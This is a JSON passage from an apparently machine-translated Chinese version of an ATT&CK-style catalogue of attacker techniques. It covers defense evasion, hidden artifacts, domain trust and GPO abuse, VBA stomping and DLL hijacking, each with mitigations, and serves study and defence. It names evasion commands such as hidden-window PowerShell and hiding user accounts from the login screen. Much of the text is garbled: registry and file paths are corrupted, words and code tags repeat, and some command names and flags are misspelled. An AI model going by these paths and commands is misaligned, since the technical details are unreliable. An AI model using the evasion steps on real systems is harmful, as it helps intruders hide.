          "content": "来通过修改GPO设置来自动创建恶意计划的任务/作业，在这种情况下，修改<codifify <codify <gpo_path> <gpo_path> \\ Machine \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\PEXENCES \\ SCHEDULEDTASKS \\ SCHENULEDTASKS.XML </code>。在某些情况下，对手可能会修改特定的用户权利，例如Sigeabledeleabeledegationprivilege，以"
        },
        {
          "type": "code",
          "content": " <gpo_path> \\ Machine \\ Machine \\ Michare \\ Microsf \\ Windows \\ Windows \\ secedit \\ secedit \\ gpttmpl.gpttmpl.inf.inf.inf.inf.inf "
        },
        {
          "type": "text",
          "content": "，以完全控制一个微妙的广告backdoor，并完全控制域，因为在对手控制下的用户帐户将能够修改GPO。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用审计工具（例如1.5.1及以后）识别并纠正GPO滥用机会（例如：GPO修改特权）。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑实施WMI和安全过滤，以进一步量身定制GPO的用户和计算机将适用的用户和计算机。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1484.002",
    "name": "Domain Trust Modification",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Domain Policy Modification",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会添加新的域信托，或修改现有域信托的属性以逃避防御和/或提升特权。域信任详细信息，例如域名是否已联合，允许身份验证和授权属性在域之间应用于访问共享资源的目的。这些信任对象可以包括帐户，凭据和其他应用于服务器，代币和域的身份验证材料。"
        }
      ],
      [
        {
          "type": "text",
          "content": "操纵域信托可能会使对手通过修改设置来添加其控制的对象来升级特权和/或逃避防御。例如，这可以用于伪造SAML令牌，而无需妥协签名证书以伪造新的凭据。相反，对手可以操纵域信任以添加自己的签名证书。对手还可以将域转换为联合域，这可能会使恶意信任修改，例如更改索赔发行规则以登录作为指定用户的任何有效凭据集。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "使用最少特权的本金并保护对域信托的行政访问。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1480.001",
    "name": "Environmental Keying",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Execution Guardrails",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在环境上关键有效载荷或恶意软件的其他功能，以逃避防御和约束对特定目标环境的执行。环境键合使用密码学来限制基于对手提供的特定环境条件的执行或行动，这些条件预计将存在于目标上。环境键合是执行护栏的实现，它利用加密技术来从给定的计算环境中的特定类型的值得出加密/解密密钥。"
        }
      ],
      [
        {
          "type": "text",
          "content": "值可以从特定于目标的元素得出，并用于生成加密有效载荷的解密密钥。特定于目标的值可以从特定的网络共享，物理设备，软件/软件版本，文件，加入的广告域，系统时间和本地/外部IP地址得出。通过从目标特异性环境价值中生成解密键，环境键合可以使沙箱检测，防病毒检测，信息众包以及逆向工程变得困难。这些困难可以减慢事件响应过程，并帮助对手隐藏其战术，技术和程序（TTPS）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "类似于混淆的文件或信息，对手可能会使用环境键控来保护其TTP并逃避检测。环境键合可用于将加密的有效载荷传递给目标，该有效载荷将使用特定于目标的值在执行前解密有效载荷。通过利用特定于目标的值解密对手的有效载荷可以避免用有效负载包装解密密钥或通过潜在监视的网络连接将其发送。根据收集特定目标值的技术，加密有效载荷的反向工程非常困难。这可以用来防止在不打算损害或操作的环境中暴露能力。"
        }
      ],
      [
        {
          "type": "text",
          "content": "像其他执行护栏一样，环境键合可用于防止在不打算损害或操作的环境中曝光能力。该活动不同于典型的虚拟化/沙盒逃避。虽然使用虚拟化/沙盒逃避可能涉及检查已知的沙盒值并仅在没有匹配的情况下继续执行，但使用环境键键将涉及检查必须匹配的解密和后续执行的预期目标特定值成功的。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1055",
        "name": "不要减轻",
        "description": [
          [
            {
              "type": "text",
              "content": "环境键合可能不应通过预防控制来缓解，因为它可能会保护意外的目标免于受到损害。如果有针对性，则应将努力集中在防止对手工具在活动链中较早运行，并在识别后续的恶意行为上运行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1222.001",
    "name": "Windows File and Directory Permissions Modification",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "File and Directory Permissions Modification",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改文件或目录权限/属性以逃避访问控制列表（ACL）和访问受保护的文件。文件和目录权限通常由文件或目录所有者配置的ACL或具有适当权限的用户管理。文件和目录ACL实现因平台而异，但通常明确指定了哪些用户或组可以执行哪些操作（读，写，执行等）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Windows实施文件和目录ACL作为酌处访问控制列表（DACL）。与标准ACL类似，DACLS标识允许或拒绝访问可靠对象的帐户。尝试访问可靠对象时，系统会按顺序检查DACL中的访问控制条目。如果找到匹配条目，则授予对象的访问。否则，访问将被拒绝。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用内置Windows命令与DACL进行交互，例如"
        },
        {
          "type": "code",
          "content": " iCacls "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " cacls "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " takeown "
        },
        {
          "type": "text",
          "content": " </code>和"
        },
        {
          "type": "code",
          "content": " attrib </code </code "
        },
        {
          "type": "text",
          "content": "，可以在特定文件和文件夹上授予对手更高的权限。此外，PowerShell提供可用于检索或修改文件和目录DACL的CMDLET。特定的文件和目录修改可能是许多技术的必需步骤，例如通过可访问性功能，启动或登录初始化脚本建立持久性，或者通过劫持执行流进行tainting/tainting/tainting/tainting/劫持其他乐器二进制/配置文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保关键的系统文件以及已知的被对手滥用的文件具有限制性权限，并由适当特权的帐户所有，尤其是如果用户不需要访问，也不会抑制系统功能。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "对文件和目录应用更多的限制性权限可以防止对手修改访问控制列表。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1222.002",
    "name": "Linux and Mac File and Directory Permissions Modification",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "File and Directory Permissions Modification",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改文件或目录权限/属性以逃避访问控制列表（ACL）和访问受保护的文件。文件和目录权限通常由文件或目录所有者配置的ACL或具有适当权限的用户管理。文件和目录ACL实现因平台而异，但通常明确指定了哪些用户或组可以执行哪些操作（读，写，执行等）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "大多数基于Linux和Linux的平台都提供了一组标准的权限组（用户，组和其他）以及应用于每个组的标准权限（读，写和执行）。尽管每个平台权限实现的细微差别可能会有所不同，但大多数平台提供了两个主要命令来操纵文件和目录ACL："
        },
        {
          "type": "code",
          "content": " chown </code </code </code </code "
        },
        {
          "type": "text",
          "content": "（更改所有者）和"
        },
        {
          "type": "code",
          "content": " chmod "
        },
        {
          "type": "text",
          "content": " </code>（更改模式的缩写）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对抗性可以使用这些命令使自己成为文件和目录的所有者，或者如果当前权限允许，则更改模式。他们随后可以将其他人锁定在文件中。特定的文件和目录修改可能是许多技术的必需步骤，例如通过Unix Shell配置修改建立持久性，或通过劫持执行流进行修改或劫持其他仪器二进制/配置文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保关键的系统文件以及已知的被对手滥用的文件具有限制性权限，并由适当特权的帐户所有，尤其是如果用户不需要访问，也不会抑制系统功能。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "对文件和目录应用更多的限制性权限可以防止对手修改访问控制列表。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1564.001",
    "name": "Hidden Files and Directories",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hide Artifacts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会设置文件和目录以隐藏以逃避检测机制。为了防止普通用户在系统上意外更改特殊文件，大多数操作系统都具有“隐藏”文件的概念。当用户用GUI浏览文件系统或在命令行上使用普通命令时，这些文件不会显示。用户必须明确要求通过一系列图形用户界面（GUI）提示或使用命令行交换机显示隐藏的文件（"
        },
        {
          "type": "code",
          "content": " dir/a "
        },
        {
          "type": "text",
          "content": " for Windows和"
        },
        {
          "type": "code",
          "content": " ls –a "
        },
        {
          "type": "text",
          "content": "对于Linux和MacOS）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux和Mac上，用户可以简单地将特定的文件标记为隐藏的特定文件。作为文件或文件夹名称中的第一个字符。默认情况下，从Finder应用程序和标准命令行实用程序（例如“ LS”）中查看的默认情况下，隐藏了以“。”开头的文件和文件夹。用户必须专门更改设置以使这些文件可查看。"
        }
      ],
      [
        {
          "type": "text",
          "content": "MacOS上的文件也可以用UF_HIDDER标志标记，该标志使它们无法在Finder.App中看到，但仍允许它们在终端中看到它们。在Windows上，用户可以使用attrib.exe二进制标记特定的文件为隐藏。许多应用程序创建这些隐藏的文件和文件夹来存储信息，以免将用户的工作区弄乱。例如，SSH实用程序创建一个.ssh文件夹，该文件夹隐藏并包含用户已知的主机和键。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以将其用于他们的优势，以将文件和文件夹隐藏在系统上的任何位置，并逃避典型的用户或系统分析，该分析不包括对隐藏文件的研究。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1564.002",
    "name": "Hidden Users",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hide Artifacts",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用隐藏的用户隐藏他们创建或修改的用户帐户的存在。当给定系统上有许多用户帐户，或者他们想向其他用户隐藏其管理或其他管理帐户时，管理员可能希望隐藏用户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在MacOS中，对手可以通过操纵PLIST文件，文件夹属性和用户属性来创建或修改用户。为了防止用户在登录屏幕上和系统首选项中显示，对手可以将用户设置为500以下，并将键值设置为"
        },
        {
          "type": "code",
          "content": " hide500user </code </code </code "
        },
        {
          "type": "text",
          "content": " "
        },
        {
          "type": "code",
          "content": " true "
        },
        {
          "type": "text",
          "content": "代码>/library/preferences/com.apple.loginwindow </code> plist文件。每个用户都有与之关联的用户ID。当"
        },
        {
          "type": "code",
          "content": " hide500user "
        },
        {
          "type": "text",
          "content": "键值设置为"
        },
        {
          "type": "code",
          "content": " true "
        },
        {
          "type": "text",
          "content": "时，登录屏幕和系统首选项中未出现的用户ID的用户不会出现。使用命令行，对手可以使用"
        },
        {
          "type": "code",
          "content": " dscl "
        },
        {
          "type": "text",
          "content": "实用程序来通过将"
        },
        {
          "type": "code",
          "content": " Ishidden "
        },
        {
          "type": "text",
          "content": "属性设置为"
        },
        {
          "type": "code",
          "content": " 1 "
        },
        {
          "type": "text",
          "content": "来创建隐藏的用户帐户。对手还可以通过将"
        },
        {
          "type": "code",
          "content": " chflags "
        },
        {
          "type": "text",
          "content": "更改为“隐藏”来隐藏用户的主文件夹。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会类似地将用户帐户隐藏在Windows中。对手可以设置"
        },
        {
          "type": "code",
          "content": " hklm \\ Software \\ Microsoft \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Winlogon \\ specialAccounts \\ userList \\ userList "
        },
        {
          "type": "text",
          "content": "注册表键> </code> 0 </code> for </code> for </code> for特定用户以防止该用户被列出。在登录屏幕上。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux系统上，对手可能会将用户帐户隐藏在登录屏幕上，也称为问候器。对手可能使用的方法取决于该分布当前使用的显示管理器。例如，在使用GNOME Display Manger（GDM）的Ubuntu系统上，可以使用"
        },
        {
          "type": "code",
          "content": " gsettings "
        },
        {
          "type": "text",
          "content": "命令（ex："
        },
        {
          "type": "code",
          "content": " sudo> sudo -U gdm gsettings set org.gnome）隐藏帐户。登录屏幕禁用 - 用户列表true "
        },
        {
          "type": "text",
          "content": "）。显示经理并非锚定在特定的分布中，并且可能由用户或对手更改。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "如果计算机加入了域，则组策略可以帮助限制创建或隐藏用户的能力。同样，防止修改"
            },
            {
              "type": "code",
              "content": "/library/preferences/com.apple.loginwindow "
            },
            {
              "type": "text",
              "content": " "
            },
            {
              "type": "code",
              "content": " hide500user "
            },
            {
              "type": "text",
              "content": "值</code>值将迫使所有用户可见。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1564.003",
    "name": "Hidden Window",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hide Artifacts",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会使用隐藏的窗户来隐藏恶意活动，从而使用户透明地看到。在某些情况下，当应用程序执行操作时通常会显示的窗口可以隐藏。系统管理员可以将其用于避免在执行管理任务时破坏用户工作环境。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Windows上，Windows的脚本语言中有多种功能，例如PowerShell，JScript和Visual Basic，可以隐藏窗口。一个例子是"
        },
        {
          "type": "code",
          "content": " powershell.exe -windowstyle隐藏"
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "同样，在MacOS上，在属性列表（PLIST）文件中列出了应用程序运行方式的配置。这些文件中的标签之一可以是"
        },
        {
          "type": "code",
          "content": " apple.awt.uielement "
        },
        {
          "type": "text",
          "content": "，它允许使用Java应用程序来防止应用程序的图标出现在码头中。一个常见的用途是当应用程序托盘中运行应用程序时，但也不想出现在码头中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用这些功能，以隐藏用户的其他可见窗口，以免提醒用户对系统上的对手活动。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "使用反病毒软件限制或限制程序执行。在MacOS上，允许具有PLIST标签的允许列表程序。所有其他程序都应被认为是可疑的。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1564.004",
    "name": "NTFS File Attributes",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hide Artifacts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用NTFS文件属性隐藏其恶意数据以逃避检测。每个新技术文件系统（NTFS）格式的分区都包含一个主文件表（MFT），该表保留了分区上每个文件/目录的记录。在MFT条目中是文件属性，例如扩展属性（EA）和数据[存在多个数据属性时称为替代数据流（ADSS）]，可用于存储任意数据（甚至完整的文件）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以在文件属性元数据中而不是直接在文件中存储恶意数据或二进制文件。这可能是为了逃避某些防御能力，例如静态指标扫描工具和防病毒病毒。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑调整NTFS EA的读写权限，尽管应该对其进行测试以确保不阻碍常规操作操作。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1564.005",
    "name": "Hidden File System",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hide Artifacts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用隐藏的文件系统对用户和安全工具隐藏恶意活动。文件系统提供了一种从物理存储中存储和访问数据的结构。通常，用户通过应用程序与文件系统互动，这些应用程序允许他们访问文件和目录，这是其物理位置的抽象（例如：磁盘扇区）。标准文件系统包括FAT，NTFS，EXT4和APF。文件系统还可以包含其他结构，例如NTFS中的“音量启动记录”（VBR）和主文件表（MFT）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用自己的抽象文件系统，与受感染系统上存在的标准文件系统分开。这样，对手可以隐藏恶意组件的存在，并从安全工具中隐藏文件输入/输出。隐藏的文件系统有时称为虚拟文件系统，可以通过多种方式实现。一种实现是将文件系统存储在由磁盘结构或标准文件系统分区未使用的保留磁盘空间中。另一个实现可能是让对手将自己的便携式分区图像作为标准文件系统顶部的文件放置。对手也可以以非标准的方式跨现有文件系统结构片段。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1564.006",
    "name": "Run Virtual Instance",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hide Artifacts",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用虚拟实例进行恶意操作以避免检测。存在多种虚拟化技术，可以仿真计算机或计算环境。通过在虚拟实例中运行恶意代码，对手可以隐藏与其行为相关的工具，这些工具无法在虚拟实例中监视活动的安全工具。此外，根据虚拟网络实现（例如：桥接适配器），虚拟实例生成的网络流量可能很难追溯到折衷的主机，因为IP地址和主机名可能不匹配已知值。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以利用本机支持虚拟化（EX：HYPER-V）或丢弃必要的文件来运行虚拟实例（例如：VirtualBox二进制文件）。运行虚拟实例后，对手可以在访客和主机之间创建一个共享文件夹，并具有权限，使虚拟实例能够与主机文件系统进行交互。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "如果在给定环境中不需要的话，请禁用Hyper-V。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "使用应用程序控件来减轻未经批准的虚拟化软件的安装和使用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1564.007",
    "name": "VBA Stomping",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hide Artifacts",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过用良性数据替换VBA源代码，隐藏嵌入了MS Office文档中的恶意视觉基本（VBA）有效载荷。"
        }
      ],
      [
        {
          "type": "text",
          "content": "MS Office文档，带有嵌入式VBA内容存储源代码在模块流的内部。每个模块流都有一个"
        },
        {
          "type": "code",
          "content": " perfermancecache "
        },
        {
          "type": "text",
          "content": "，该</code>存储了称为p代码的VBA源代码的单独编译版本。当在"
        },
        {
          "type": "code",
          "content": " _vba_project "
        },
        {
          "type": "text",
          "content": "流中指定的MS Office版本时，执行P代码（其中包含VBA项目的版本依赖性描述）与主机MS Office应用程序的版本匹配。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过零，良性代码或随机字节覆盖VBA源代码位置，同时离开先前汇编的恶意P代码，从而隐藏恶意VBA代码。扫描恶意VBA源代码的工具可能会被绕过，因为不需要的代码隐藏在编译的p代码中。如果删除了VBA源代码，则某些工具甚至可能认为没有宏存在。如果"
        },
        {
          "type": "code",
          "content": " _vba_project "
        },
        {
          "type": "text",
          "content": "流和主机MS Office应用程序之间存在版本匹配，则将执行p代码，否则良性VBA源代码将被解压缩并重新编译为P代码，从而删除恶意p代码并可能绕过动态分析。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "关闭或限制对不需要的VB组件的访问。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1564.008",
    "name": "Email Hiding Rules",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hide Artifacts",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会使用电子邮件规则将入站电子邮件隐藏在被折磨的用户邮箱中。许多电子邮件客户端允许用户为各种电子邮件功能创建收件箱规则，包括将电子邮件移动到其他文件夹，将电子邮件标记为读取或删除电子邮件。可以在电子邮件客户端或外部功能中创建或修改规则，例如"
        },
        {
          "type": "code",
          "content": " new InboxRule "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " set-inboxrule "
        },
        {
          "type": "text",
          "content": " powershell powershell cmdlets in Windows Systems上。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以在被折衷的用户邮箱中利用电子邮件规则来删除和/或将电子邮件移至较不明显的文件夹中。对手可以这样做，以隐藏安全警报，C2通信或对从折衷帐户发送的内部矛盾电子邮件的响应。"
        }
      ],
      [
        {
          "type": "text",
          "content": "组织中的任何用户或管理员（或具有有效凭据的对手）都可以创建规则以自动移动或删除电子邮件。如果用户或后卫立即看到电子邮件内容，则可以滥用这些规则以损害/延迟检测。恶意规则通常会根据关键字过滤电子邮件（例如"
        },
        {
          "type": "code",
          "content": "恶意软件"
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": "可疑"
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " phish "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " hack "
        },
        {
          "type": "text",
          "content": "）在消息主体和主题行中找到。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在某些环境中，管理员可能能够启用在组织范围内而不是在单个收件箱上运行的电子邮件规则。例如，Microsoft Exchange支持运输规则，该规则评估了组织在用户指定条件下收到的所有邮件，然后在邮件上执行遵守这些条件的用户指定操作。滥用此类功能的对手可能能够自动修改或删除与特定主题有关的所有电子邮件（例如内部安全事件通知）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "企业电子邮件解决方案可能具有监视机制，其中可能包括定期审核收件箱规则的能力。"
            }
          ],
          [
            {
              "type": "text",
              "content": "在交换环境中，管理员可以使用"
            },
            {
              "type": "code",
              "content": " Get-inboxRule "
            },
            {
              "type": "text",
              "content": "/"
            },
            {
              "type": "code",
              "content": " remove-inboxRule "
            },
            {
              "type": "text",
              "content": "和"
            },
            {
              "type": "code",
              "content": " get-transportrule "
            },
            {
              "type": "text",
              "content": "/"
            },
            {
              "type": "code",
              "content": " remove-transportrule "
            },
            {
              "type": "text",
              "content": "发现并删除潜在的恶意收件箱和运输规则。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1564.009",
    "name": "Resource Forking",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hide Artifacts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用资源叉以隐藏恶意代码或可执行文件，以逃避检测和绕过安全性应用程序。资源叉为存储资源（例如缩略图，菜单定义，图标，对话框和代码）等资源的结构化方法提供了一种结构化方法。使用"
        },
        {
          "type": "code",
          "content": " ls -l@"
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " XATTR -L "
        },
        {
          "type": "text",
          "content": "命令，在显示文件的扩展属性时，使用资源叉的使用是可识别的。资源叉已被弃用并用应用程序捆绑结构代替。非定位资源放置在应用程序捆绑包的顶级目录，而本地化资源则放在"
        },
        {
          "type": "code",
          "content": "/resources "
        },
        {
          "type": "text",
          "content": "文件夹中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用资源分叉隐藏可能直接存储在文件中的恶意数据。对手可以在指定的偏移量中使用附加的资源叉执行内容，该偏移将移动到可执行的位置然后调用。资源叉内容也可以被混淆/加密，直到执行为止。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "应用程序开发人员指导",
        "description": [
          [
            {
              "type": "text",
              "content": "配置应用程序使用应用程序包结构，该结构利用"
            },
            {
              "type": "code",
              "content": "/Resources "
            },
            {
              "type": "text",
              "content": "文件夹位置。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1564.010",
    "name": "Process Argument Spoofing",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hide Artifacts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以尝试通过覆盖进程内存来隐藏过程命令行参数。流程命令行参数存储在过程环境块（PEB）中，这是Windows用于存储过程/使用的各种信息的数据结构。PEB包括执行过程时引用的过程命令行参数。创建过程时，监视过程创建的防御工具/传感器可能会从PEB检索过程参数。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会操纵过程核心以逃避防御能力。例如，可以滥用过程挖空以在悬浮状态下以良性论点产生一个过程。在产生过程并初始化PEB（可能通过工具/传感器记录的过程信息）之后，对手可能会覆盖PEB以修改命令行参数（例如：使用本机API <code> write> writeprocessmemory（）代码>函数）然后使用恶意参数恢复过程执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以执行具有恶意命令行参数的过程，然后用良性参数修补内存，该参数可能绕过后续的过程内存分析。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这种行为也可以与其他技巧（例如父型PID欺骗）结合使用，以操纵或进一步逃避基于过程的检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1564.011",
    "name": "Ignore Process Interrupts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hide Artifacts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行从过程中断信号隐藏的命令来逃避防御机制。许多操作系统使用信号传递消息以控制过程行为。命令口译员通常包括忽略错误和其他挂断的特定命令/标志，例如活动会话的用户注销时。防御工具和/或分析师也可以使用这些中断信号来暂停或终止指定的运行过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用"
        },
        {
          "type": "code",
          "content": " nohup "
        },
        {
          "type": "text",
          "content": "，powershell "
        },
        {
          "type": "code",
          "content": " -eroraction-eroraction silcontinecontinue "
        },
        {
          "type": "text",
          "content": "调用进程，或者可能免于挂起的类似命令。这可能会使恶意命令和恶意软件通过系统事件继续执行，这些系统将终止其执行，例如用户登录或终止其C2网络连接。"
        }
      ],
      [
        {
          "type": "text",
          "content": "隐藏在过程中断信号中可能会使恶意软件继续执行，但是与陷阱不同，这并不能建立持久性，因为一旦实际终止，该过程就不会重新撤回。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1574.001",
    "name": "DLL Search Order Hijacking",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持用于加载DLL的搜索顺序来执行自己的恶意有效载荷。Windows系统使用一种常见方法来寻找所需的DLL来加载到程序中。劫持DLL负载可能是为了建立持久性以及提高特权和/或逃避文件执行的限制。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过多种方式劫持DLL负载。对手可能会在一个目录中播放特洛伊木马动态链接库文件（DLL），该目录将在合法库的位置之前搜索，该图书馆将由程序请求，从而导致窗户在受害者计划要求时加载其恶意库。对手也可以通过将具有与模棱两可的DLL放置在Windows在合法的DLL之前搜索的位置中使用的恶意DLL来执行DLL预加载，也称为二进制种植攻击。通常，此位置是该程序的当前工作目录。当程序将当前目录设置为远程位置（例如Web共享）之前，远程DLL预加载攻击会发生。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以通过DLL重定向直接修改搜索顺序，在启用后（在注册表和创建重定向文件中）可能会导致程序加载其他DLL。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果将搜索订单验证程序配置为以较高的特权级别运行，则加载的对手控制的DLL也将在较高级别上执行。在这种情况下，根据程序，该技术可用于从用户到管理员或系统或从管理员到系统的特权升级，具体取决于程序。成为劫持路径受害者的程序似乎通常行事正常，因为恶意DLL可能被配置为还加载了原本要替换的合法DLL。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够检测企业内部系统上劫持的DLL搜索订单劫持机会并纠正它们的审计工具。PowerSploit框架之类的工具包包含动力模块，可用于探索用于劫持弱点的系统。"
            }
          ],
          [
            {
              "type": "text",
